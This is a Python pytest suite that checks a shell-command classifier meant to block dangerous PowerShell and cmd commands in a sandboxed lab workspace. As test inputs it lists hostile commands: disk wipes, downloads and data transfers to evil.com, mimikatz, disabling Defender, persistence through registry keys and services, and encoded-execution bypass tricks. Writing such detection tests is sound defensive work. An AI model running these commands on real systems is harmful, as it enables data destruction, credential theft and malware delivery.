"""Adversarial tests for lab_shell.classify_lab_command().

These tests exercise the classifier with known bypass techniques,
edge cases, and adversarial inputs. They do NOT execute any commands.
"""
from __future__ import annotations

import pytest

import shutil
import tempfile
from pathlib import Path
from uuid import uuid4

from core.lab_shell import (
    LAB_ALLOWED,
    LAB_APPROVAL_REQUIRED,
    LAB_BLOCKED,
    audit_workspace_changes,
    classify_lab_command,
    execute_lab_command,
    _snapshot_workspace,
)

# ── helpers ──────────────────────────────────────────────────────────────

def _classify(cmd: str, *, shell: str = "powershell") -> dict:
    """Classify without creating real workspaces."""
    return classify_lab_command(cmd, shell_kind=shell, workspace_id="test-adversarial")


def _decision(cmd: str, **kw) -> str:
    return _classify(cmd, **kw)["decision"]


def _blocked_cats(cmd: str, **kw) -> list[str]:
    return _classify(cmd, **kw)["blocked_categories"]


# ══════════════════════════════════════════════════════════════════════════
# SECTION 1: Safe commands that MUST be allowed
# ══════════════════════════════════════════════════════════════════════════

class TestAllowedInspection:
    """Read-only inspection commands must auto-allow."""

    def test_dir(self):
        assert _decision("dir") == LAB_ALLOWED

    def test_dir_with_path(self):
        assert _decision("dir .\\subfolder") == LAB_ALLOWED

    def test_get_childitem(self):
        assert _decision("Get-ChildItem") == LAB_ALLOWED

    def test_pwd(self):
        assert _decision("pwd") == LAB_ALLOWED

    def test_get_content(self):
        assert _decision("Get-Content myfile.txt") == LAB_ALLOWED

    def test_type(self):
        assert _decision("type readme.txt") == LAB_ALLOWED

    def test_tree(self):
        assert _decision("tree") == LAB_ALLOWED

    def test_get_process(self):
        assert _decision("Get-Process") == LAB_ALLOWED

    def test_get_date(self):
        assert _decision("Get-Date") == LAB_ALLOWED

    def test_select_string(self):
        assert _decision("Select-String -Pattern 'hello' -Path *.txt") == LAB_ALLOWED

    def test_test_path(self):
        assert _decision("Test-Path .\\file.txt") == LAB_ALLOWED

    def test_mkdir(self):
        assert _decision("mkdir newdir") == LAB_ALLOWED

    def test_new_item_directory(self):
        assert _decision("New-Item -ItemType Directory -Path newdir") == LAB_ALLOWED


class TestAllowedMutationRequiresApproval:
    """Benign mutations in workspace should require approval, not block."""

    def test_copy_item(self):
        assert _decision("Copy-Item a.txt b.txt") == LAB_APPROVAL_REQUIRED

    def test_move_item(self):
        assert _decision("Move-Item a.txt b.txt") == LAB_APPROVAL_REQUIRED

    def test_set_content(self):
        assert _decision("Set-Content -Path file.txt -Value 'hello'") == LAB_APPROVAL_REQUIRED

    def test_echo_redirect(self):
        assert _decision("echo hello > file.txt") == LAB_APPROVAL_REQUIRED

    def test_simple_del(self):
        assert _decision("del myfile.txt") == LAB_APPROVAL_REQUIRED

    def test_remove_item_no_recurse(self):
        assert _decision("Remove-Item myfile.txt") == LAB_APPROVAL_REQUIRED


# ══════════════════════════════════════════════════════════════════════════
# SECTION 2: Catastrophic commands that MUST be blocked
# ══════════════════════════════════════════════════════════════════════════

class TestBlockDestructiveFilesystem:
    """Recursive/forced deletion must always be blocked."""

    def test_rm_recurse(self):
        assert _decision("Remove-Item -Recurse -Force .") == LAB_BLOCKED

    def test_rm_rf_alias(self):
        assert _decision("rm -Recurse -Force .\\dir") == LAB_BLOCKED

    def test_del_s_f(self):
        assert _decision("del /s /f *.*") == LAB_BLOCKED

    def test_rd_s_q(self):
        assert _decision("rd /s /q somedir") == LAB_BLOCKED

    def test_rmdir_s_q(self):
        assert _decision("rmdir /s /q somedir") == LAB_BLOCKED

    def test_format(self):
        assert _decision("format D:") == LAB_BLOCKED

    def test_diskpart(self):
        assert _decision("diskpart") == LAB_BLOCKED

    def test_clear_disk(self):
        assert _decision("Clear-Disk -Number 0") == LAB_BLOCKED

    def test_cipher_wipe(self):
        assert _decision("cipher /w:D:") == LAB_BLOCKED


class TestBlockCredentialTheft:
    """Network/credential exfiltration must be blocked."""

    def test_invoke_webrequest(self):
        assert _decision("Invoke-WebRequest https://evil.com") == LAB_BLOCKED

    def test_curl(self):
        assert _decision("curl https://evil.com") == LAB_BLOCKED

    def test_wget(self):
        assert _decision("wget https://evil.com/payload") == LAB_BLOCKED

    def test_bitsadmin(self):
        assert _decision("bitsadmin /transfer job https://evil.com out.exe") == LAB_BLOCKED

    def test_mimikatz(self):
        assert _decision("mimikatz") == LAB_BLOCKED

    def test_password_export(self):
        assert _decision("password export to file") == LAB_BLOCKED

    def test_credential_copy(self):
        assert _decision("credential copy secret.txt") == LAB_BLOCKED


class TestBlockSecurityDisabling:
    def test_disable_defender(self):
        assert _decision("Set-MpPreference -DisableRealtimeMonitoring $true") == LAB_BLOCKED

    def test_stop_windefend(self):
        assert _decision("sc stop windefend") == LAB_BLOCKED

    def test_firewall(self):
        assert _decision("netsh advfirewall set allprofiles state off") == LAB_BLOCKED


class TestBlockPersistence:
    def test_reg_add(self):
        assert _decision("reg add HKLM\\Software\\Test /v key /d value") == LAB_BLOCKED

    def test_schtasks(self):
        assert _decision("schtasks /create /tn task /tr calc.exe") == LAB_BLOCKED

    def test_bcdedit(self):
        assert _decision("bcdedit /set testsigning on") == LAB_BLOCKED

    def test_sc_create(self):
        assert _decision("sc create MyService binPath=evil.exe") == LAB_BLOCKED

    def test_new_service(self):
        assert _decision("New-Service -Name svc -BinaryPathName evil.exe") == LAB_BLOCKED


class TestBlockProcessControl:
    def test_taskkill_force(self):
        assert _decision("taskkill /f /im explorer.exe") == LAB_BLOCKED

    def test_stop_process_force(self):
        assert _decision("Stop-Process -Force -Name explorer") == LAB_BLOCKED

    def test_wmic_process_delete(self):
        assert _decision("wmic process where name='calc.exe' delete") == LAB_BLOCKED


class TestBlockResourceDestruction:
    def test_infinite_loop_ps(self):
        assert _decision("while($true) { Start-Process cmd }") == LAB_BLOCKED

    def test_infinite_loop_cmd(self):
        assert _decision("for /l %i in (1,0,1) do echo loop") == LAB_BLOCKED

    def test_start_job(self):
        assert _decision("Start-Job { while($true) {} }") == LAB_BLOCKED

    def test_start_process_hidden(self):
        assert _decision("Start-Process cmd -WindowStyle Hidden") == LAB_BLOCKED


class TestBlockChaining:
    def test_and_chain(self):
        assert _decision("dir && del file.txt") == LAB_BLOCKED

    def test_or_chain(self):
        assert _decision("dir || del file.txt") == LAB_BLOCKED

    def test_semicolon(self):
        assert _decision("dir; del file.txt") == LAB_BLOCKED


class TestBlockEncodedExecution:
    def test_encoded_command(self):
        assert _decision("powershell -EncodedCommand SQBF....") == LAB_BLOCKED

    def test_enc_short(self):
        assert _decision("powershell -enc SQBF") == LAB_BLOCKED

    def test_frombase64(self):
        assert _decision("[Convert]::FromBase64String('AAAA')") == LAB_BLOCKED

    def test_invoke_expression(self):
        assert _decision("Invoke-Expression 'Get-Process'") == LAB_BLOCKED

    def test_iex(self):
        assert _decision("iex 'Get-Process'") == LAB_BLOCKED


class TestBlockNestedShells:
    def test_nested_cmd_from_ps(self):
        assert _decision("cmd /c dir", shell="powershell") == LAB_BLOCKED

    def test_nested_bash(self):
        assert _decision("bash -c 'ls'") == LAB_BLOCKED

    def test_wscript(self):
        assert _decision("wscript evil.vbs") == LAB_BLOCKED

    def test_cscript(self):
        assert _decision("cscript evil.js") == LAB_BLOCKED

    def test_mshta(self):
        assert _decision("mshta javascript:alert(1)") == LAB_BLOCKED

    def test_rundll32(self):
        assert _decision("rundll32 shell32.dll,ShellExec_RunDLL evil.exe") == LAB_BLOCKED

    def test_regsvr32(self):
        assert _decision("regsvr32 /s evil.dll") == LAB_BLOCKED

    def test_same_shell_allowed(self):
        """Running the same shell is not a nested escape."""
        # powershell calling powershell is the current shell, should NOT be blocked as nested
        result = _classify("powershell Get-Date", shell="powershell")
        assert "nested_shell_or_launcher" not in result["blocked_categories"]


class TestBlockHostPaths:
    def test_drive_letter(self):
        assert _decision("dir C:\\Windows") == LAB_BLOCKED

    def test_unc_path(self):
        assert _decision("dir \\\\server\\share") == LAB_BLOCKED

    def test_env_userprofile(self):
        assert _decision("dir %userprofile%") == LAB_BLOCKED

    def test_env_appdata(self):
        assert _decision("dir %appdata%") == LAB_BLOCKED

    def test_ps_env_userprofile(self):
        assert _decision("dir $env:userprofile") == LAB_BLOCKED

    def test_ps_env_temp(self):
        assert _decision("dir $env:temp") == LAB_BLOCKED

    def test_registry_hklm(self):
        assert _decision("dir HKLM:\\Software") == LAB_BLOCKED

    def test_registry_hkcu(self):
        assert _decision("dir HKCU:\\Software") == LAB_BLOCKED

    def test_parent_traversal(self):
        assert _decision("dir ..\\..\\..") == LAB_BLOCKED


class TestBlockPipelines:
    def test_pipe_to_remove(self):
        assert _decision("Get-ChildItem | Remove-Item") == LAB_BLOCKED

    def test_pipe_to_del(self):
        assert _decision("dir | del ") == LAB_BLOCKED

    def test_pipe_to_set_content(self):
        assert _decision("Get-Process | Set-Content log.txt") == LAB_BLOCKED

    def test_pipe_to_taskkill(self):
        assert _decision("Get-Process | taskkill") == LAB_BLOCKED


class TestBlockOversized:
    def test_oversized_command(self):
        assert _decision("A" * 1201) == LAB_BLOCKED


# ══════════════════════════════════════════════════════════════════════════
# SECTION 3: Adversarial bypass attempts — these MUST be blocked
# ══════════════════════════════════════════════════════════════════════════

class TestBypassAttempts:
    """Known evasion techniques that must be caught."""

    def test_case_evasion_remove_item(self):
        assert _decision("REMOVE-ITEM -RECURSE -FORCE .") == LAB_BLOCKED

    def test_case_evasion_invoke_webrequest(self):
        assert _decision("INVOKE-WEBREQUEST https://evil.com") == LAB_BLOCKED

    def test_extra_whitespace(self):
        assert _decision("  rm   -Recurse   -Force   . ") == LAB_BLOCKED

    def test_tab_separated(self):
        assert _decision("rm\t-Recurse\t-Force\t.") == LAB_BLOCKED

    def test_newline_in_command(self):
        """Multiline commands should not bypass single-line patterns."""
        assert _decision("rm\n-Recurse\n-Force .") == LAB_BLOCKED

    def test_backtick_escape_ps(self):
        """PowerShell backtick line continuation."""
        assert _decision("Remove-Item `\n-Recurse `\n-Force .") == LAB_BLOCKED

    def test_invoke_command_remote(self):
        """Invoke-Command can run on remote machines."""
        assert _decision("Invoke-Command -ComputerName server -ScriptBlock { dir }") == LAB_BLOCKED

    def test_start_process_no_style(self):
        """Start-Process without hidden style is still a launcher."""
        assert _decision("Start-Process notepad.exe") == LAB_BLOCKED

    def test_dot_sourcing(self):
        """Dot-sourcing a script executes it in current scope."""
        result = _classify(". .\\evil.ps1")
        # This should at minimum require approval, not be auto-allowed
        assert result["decision"] != LAB_ALLOWED

    def test_ampersand_call_operator(self):
        """& is PowerShell's call operator."""
        result = _classify("& .\\evil.ps1")
        assert result["decision"] != LAB_ALLOWED

    def test_net_use(self):
        """net use can map network drives."""
        assert _decision("net use Z: \\\\server\\share") == LAB_BLOCKED

    def test_ftp(self):
        assert _decision("ftp ftp.evil.com") == LAB_BLOCKED

    def test_sftp(self):
        assert _decision("sftp user@evil.com") == LAB_BLOCKED

    def test_scp(self):
        assert _decision("scp file.txt user@evil.com:") == LAB_BLOCKED

    def test_windows_short_path(self):
        """8.3 short names can reference host paths."""
        result = _classify("dir PROGRA~1")
        # This should at minimum not be auto-allowed (it's an alias for C:\Program Files)
        assert result["decision"] != LAB_ALLOWED

    def test_subst_drive(self):
        """subst creates virtual drives that could point anywhere."""
        result = _classify("subst Z: .")
        assert result["decision"] != LAB_ALLOWED

    def test_mklink(self):
        """mklink can create symlinks/junctions to host paths."""
        result = _classify("mklink /j link C:\\Windows")
        assert result["decision"] == LAB_BLOCKED

    def test_net_webclient(self):
        """PowerShell .NET WebClient for download."""
        result = _classify("(New-Object Net.WebClient).DownloadFile('http://evil.com','out.exe')")
        # Should be blocked — it's network exfiltration via .NET
        assert result["decision"] == LAB_BLOCKED

    def test_certutil_download(self):
        """certutil can download files."""
        result = _classify("certutil -urlcache -split -f http://evil.com/payload.exe out.exe")
        # Should be blocked
        assert result["decision"] != LAB_ALLOWED

    def test_powershell_download_string(self):
        """DownloadString is a common dropper technique."""
        result = _classify("(New-Object Net.WebClient).DownloadString('http://evil.com')")
        assert result["decision"] == LAB_BLOCKED

    def test_set_location_host(self):
        """Set-Location to host path escapes workspace."""
        assert _decision("Set-Location C:\\Windows") == LAB_BLOCKED

    def test_cd_host_path(self):
        """cd to host path."""
        assert _decision("cd C:\\Users") == LAB_BLOCKED

    def test_pushd_host(self):
        """pushd to host path."""
        assert _decision("Push-Location C:\\Windows") == LAB_BLOCKED

    def test_environment_variable_expansion(self):
        """$env: syntax for host paths."""
        assert _decision("Get-Content $env:systemroot\\system32\\drivers\\etc\\hosts") == LAB_BLOCKED

    def test_registry_provider(self):
        assert _decision("Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software") == LAB_BLOCKED

    def test_wmi_query(self):
        """WMI can query/modify system state."""
        result = _classify("Get-WmiObject Win32_Process")
        assert result["decision"] != LAB_ALLOWED

    def test_cim_instance(self):
        """CIM is the modern WMI equivalent."""
        result = _classify("Get-CimInstance Win32_Service")
        assert result["decision"] != LAB_ALLOWED

    def test_add_type_compile_csharp(self):
        """Add-Type can compile and run arbitrary C# code."""
        result = _classify("Add-Type -TypeDefinition 'using System; public class Evil { }'")
        assert result["decision"] != LAB_ALLOWED

    def test_empty_command(self):
        assert _decision("") == LAB_BLOCKED

    def test_whitespace_only(self):
        assert _decision("   ") == LAB_BLOCKED


# ══════════════════════════════════════════════════════════════════════════
# SECTION 4: Edge cases and classification correctness
# ══════════════════════════════════════════════════════════════════════════

class TestClassificationMetadata:
    """Verify classification returns correct metadata."""

    def test_allowed_has_low_risk(self):
        result = _classify("dir")
        assert result["risk_level"] == "low"
        assert result["intent"] == "inspection"

    def test_blocked_has_high_risk(self):
        result = _classify("rm -Recurse -Force .")
        assert result["risk_level"] == "high"

    def test_blocked_includes_category(self):
        result = _classify("rm -Recurse -Force .")
        assert "destructive_filesystem_wipe" in result["blocked_categories"]

    def test_approval_required_has_reasons(self):
        result = _classify("Copy-Item a.txt b.txt")
        assert len(result["reasons"]) > 0

    def test_workspace_always_present(self):
        result = _classify("dir")
        assert "workspace" in result
        assert "workspace_id" in result["workspace"]

    def test_normalized_command_trimmed(self):
        result = _classify("  dir   . ")
        assert result["normalized_command"] == "dir ."

    def test_multiple_categories_collected(self):
        """A command can hit multiple block categories."""
        result = _classify("rm -Recurse -Force C:\\Windows")
        cats = result["blocked_categories"]
        assert "destructive_filesystem_wipe" in cats
        assert "host_scope_reference" in cats


# ══════════════════════════════════════════════════════════════════════════
# SECTION 5: Workspace auditing
# ══════════════════════════════════════════════════════════════════════════

class TestWorkspaceAudit:
    """Test the workspace snapshot and audit diffing."""

    def test_empty_snapshots(self):
        audit = audit_workspace_changes({}, {})
        assert audit["total_changes"] == 0
        assert audit["created"] == []
        assert audit["deleted"] == []
        assert audit["modified"] == []

    def test_detect_created_file(self):
        before: dict[str, str] = {}
        after = {"new.txt": "abc123"}
        audit = audit_workspace_changes(before, after)
        assert "new.txt" in audit["created"]
        assert audit["total_changes"] == 1

    def test_detect_deleted_file(self):
        before = {"old.txt": "abc123"}
        after: dict[str, str] = {}
        audit = audit_workspace_changes(before, after)
        assert "old.txt" in audit["deleted"]
        assert audit["total_changes"] == 1

    def test_detect_modified_file(self):
        before = {"file.txt": "hash1"}
        after = {"file.txt": "hash2"}
        audit = audit_workspace_changes(before, after)
        assert "file.txt" in audit["modified"]
        assert audit["total_changes"] == 1

    def test_unchanged_file_not_reported(self):
        before = {"file.txt": "same_hash"}
        after = {"file.txt": "same_hash"}
        audit = audit_workspace_changes(before, after)
        assert audit["total_changes"] == 0

    def test_snapshot_real_directory(self):
        """Snapshot a temp directory with a real file."""
        tmpdir = Path(tempfile.mkdtemp())
        try:
            (tmpdir / "hello.txt").write_text("world")
            snap = _snapshot_workspace(tmpdir)
            assert "hello.txt" in snap
            assert len(snap["hello.txt"]) == 16  # sha256[:16]
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)


# ══════════════════════════════════════════════════════════════════════════
# SECTION 6: Execution in disposable workspace (safe — workspace only)
# ══════════════════════════════════════════════════════════════════════════

def _uid():
    return f"t-{uuid4().hex[:8]}"


class TestExecutionInWorkspace:
    """Test actual command execution inside disposable lab workspace.
    These commands only touch the ephemeral workspace, never the host."""

    def test_blocked_command_not_executed(self):
        result = execute_lab_command("rm -Recurse -Force .", workspace_id=_uid())
        assert result["blocked"] is True
        assert result.get("exit_code") is None or result.get("exit_code", -1) == -1

    def test_allowed_dir_executes(self):
        result = execute_lab_command("dir", workspace_id=_uid())
        assert result["ok"] is True
        assert result["exit_code"] == 0
        assert result.get("blocked") is not True

    def test_allowed_pwd_executes(self):
        result = execute_lab_command("pwd", workspace_id=_uid())
        assert result["ok"] is True
        assert "lab" in result.get("stdout_excerpt", "").lower()

    def test_mkdir_in_workspace(self):
        result = execute_lab_command("mkdir testsubdir", workspace_id=_uid())
        assert result["ok"] is True

    def test_approval_required_pauses(self):
        result = execute_lab_command("Copy-Item a.txt b.txt", workspace_id=_uid())
        assert result.get("paused") is True
        assert result.get("approval_required") is True

    def test_approval_required_runs_when_approved(self):
        """With approval_status='approved', the command executes."""
        result = execute_lab_command(
            "echo hello",
            approval_status="approved",
            workspace_id=_uid(),
        )
        assert result.get("paused") is not True

    def test_workspace_audit_present_after_execution(self):
        result = execute_lab_command("mkdir auditdir", workspace_id=_uid())
        assert result["ok"] is True
        audit = result.get("workspace_audit", {})
        assert isinstance(audit, dict)
        assert audit.get("total_changes", 0) >= 0

    def test_host_path_command_blocked(self):
        result = execute_lab_command("dir C:\\Windows", workspace_id=_uid())
        assert result["blocked"] is True

    def test_chained_command_blocked(self):
        result = execute_lab_command("dir && del file.txt", workspace_id=_uid())
        assert result["blocked"] is True

    def test_timeout_respected(self):
        """A command that exceeds timeout should be killed."""
        result = execute_lab_command(
            "Start-Sleep -Seconds 30",
            approval_status="approved",
            workspace_id=_uid(),
            settings={"lab_shell_timeout_seconds": 2},
        )
        assert result.get("timed_out") is True
